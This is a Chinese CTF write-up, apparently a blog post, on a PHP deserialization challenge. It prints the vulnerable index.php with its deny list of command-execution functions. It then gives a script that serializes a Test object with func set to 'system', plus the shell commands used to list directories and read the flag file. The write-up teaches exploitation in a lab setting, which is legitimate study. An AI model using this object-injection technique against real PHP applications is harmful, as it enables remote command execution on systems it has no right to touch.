<p>因此，我们尝试用 <code>file_get_contents()</code> 读取一下 <code>index.php</code> 的内容</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327231040.png" /></p>
<p>将代码整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里<code>get time</code> 中的 <code>call_user_func()</code> 函数能够调用的函数被禁了好多，但是这不是重点，重点是 <code>Test</code> 类里面的 <code>__destruct</code> ，这个也可以调用 <code>call_user_func()</code> 而且是不经过验证。因此思路就是构造序列化字符串作为 POST 提交的 <code>p</code> ，而POST 提交的 <code>func</code> 则为 <code>unserialize</code>。</p>
<p>接下来构造 <code>p</code> （这里的p指的是POST提交的，而不是类中的）</p>
<blockquote>
<p>这里类中的 var 其实是 public 的别名</p>
</blockquote>
<p>编写简单的PHP脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;参数&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>参数依次如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls / # 查看根目录</span><br><span class="line">2. ls   # 查看当前目录</span><br><span class="line">3. find / -name flag* # 找flag文件路径，这里会找到很多，但是其他的一看就不像</span><br><span class="line">4. cat /tmp/flagoefiu4r93 # 读取flag</span><br></pre></td></tr></table></figure></p>
<p>将上面参数带入PHP脚本，然后执行得到的字符串作为 POST 提交的 p。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232126.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232212.png" /></p>
<h1 id="总结">总结</h1>
<p>本题难度并不大，主要的难点就在于报错提示的 <code>call_user_func()</code> ，要明白它的作用。本题考的其实是PHP知识点，熟悉PHP中的函数尤其是调用系统的命令的函数以及反序列化知识点。前者其实可以在 <strong>命令执行</strong> 相关题目中积累。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
</search>
